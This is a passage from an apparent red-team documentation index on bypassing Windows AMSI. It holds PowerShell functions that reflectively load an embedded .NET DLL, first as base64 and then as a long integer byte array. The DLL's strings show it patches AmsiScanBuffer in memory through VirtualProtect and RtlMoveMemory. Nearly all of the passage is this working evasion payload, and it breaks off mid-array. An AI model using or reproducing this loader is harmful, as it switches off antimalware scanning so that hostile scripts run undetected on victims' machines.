AHkAcABhAHMAcwAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbQBzAGkAQgB5AHAAYQBzAHMAAAAAADAABgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAFw| Out-Null\n        Write-Output \"DLL has been reflected\";\n    }\n    [Bypass.AMSI]::Patch()\n}\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#same-as-6-but-integer-bytes-instead-of-base64","title":"Same as 6 but integer Bytes instead of Base64","text":"<pre><code>function MyPatch{\n  if(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) {\n    [Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 